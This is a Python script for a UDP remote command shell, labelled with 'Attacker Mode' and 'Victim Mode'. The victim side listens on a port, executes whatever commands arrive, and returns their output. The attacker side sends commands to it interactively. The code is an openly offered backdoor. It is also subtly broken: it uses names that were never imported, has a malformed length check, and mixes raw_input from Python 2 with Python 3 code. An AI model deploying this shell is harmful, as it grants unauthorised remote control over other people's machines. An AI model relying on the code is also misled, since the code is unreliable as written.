from socket import * 
from sys import *
from argparse import *
from subprocess import *

def help():
    print('\nUsage: ./R.py -t <target_host> -p <port>\n')
    print('Examples:')
    print('-------------------------------------------')
    print(' Attacker Mode')
    print('./R.py -t target-IP -p 9999\n')
    print(' Victim Mode')
    print('./R.py -l -p 9999')

def main():
    if len(argv[1:]) < 2:
        help()

    parser = ArgumentParser(add_help=False)
    parser.add_argument('-t', '--target')
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-l', '--listen', action='store_true')
    value = parser.parse_args()

    s = socket(AF_INET, SOCK_DGRAM, 0)
    
    #Victim Mode
    if (value.listen == True):
        if (value.target):
            print('Victim Mode don\'t use -t ')
            sys.exit()

        s.bind(('0.0.0.0', value.port))

        while True:
            msg, addr = s.recvfrom(65000)
            conn = msg.decode('ascii')  
            data = conn[0:].split(' ')

            if len(data[0:] > 1):
                res = run([data[0], data[1]], stdout=subprocess.PIPE)
            else:
                res = run([conn], stdout=subprocess.PIPE)

            here = res.stdout.decode('utf-8')
            s.sendto(here.encode(), addr)

        #Attacker Mode
    else:
        while True:
            c = raw_input('Victim machine:> ')
            s.sendto(c.encode('ascii'), (value.target, value.port))
            msg, addr = s.recvfrom(65000)
            print(msg.decode('utf-8'))  


if __name__ == '__main__':
    main()